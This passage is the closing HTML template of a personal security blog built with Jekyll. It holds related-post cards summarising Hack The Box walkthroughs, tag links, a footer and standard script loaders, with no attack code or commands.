 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/meta/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1654876800"
    data-df="ll"
    >
  Jun 11, 2022
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Meta</h3>
            <div class="text-muted small">
              <p>
                





                Meta is a medium rated machine on HackTheBox created by Nauten. For the user part we will abuse a CVE in exiftool to obtain a reverse shell on the machine. This will be followed up by another CVE i...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/paper/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1655481600"
    data-df="ll"
    >
  Jun 18, 2022
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Paper</h3>
            <div class="text-muted small">
              <p>
                





                User
Paper is an easy rated machine on HackTheBox created by secnigma. For the user part we will abuse an information leak through a CVE in wordpress to register an account in a rocket chat install...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Investigation/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1682092800"
    data-df="ll"
    >
  Apr 22, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Investigation</h3>
            <div class="text-muted small">
              <p>
                





                In this machine, I had to exploit a known vulnerability in exiftool, find a password in some logs, and finally reverse a program to find how to exploit it.


  Room: Investigation
  Difficulty: Med...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/paper/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Hack The Box - Paper</p>
  </a>
  

  
  <a href="/posts/CyberConFinals/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>R2D2 Backdoor - Memory Forensics</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    <!-- The Footer -->

<footer>
  <div class="container pl-lg-4 pr-lg-4">
    <div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3">
      <div class="footer-left">
        <p class="mb-0">
          Â© 2023
          <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>.
          
          <span data-toggle="tooltip" data-placement="top"
            title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
          
        </p>
      </div>

      <div class="footer-right">
        <p class="mb-0">

          

          

          Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
           with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
           theme.
        </p>
      </div>
    </div>
  </div>
  <div class="mt-auto d-flex flex-wrap justify-content-center align-items-center">
    <script src="https://www.hackthebox.eu/badge/1256978"></script>
    <script src="https://tryhackme.com/badge/50213"></script>
  </div>
</footer>


    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No results found.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

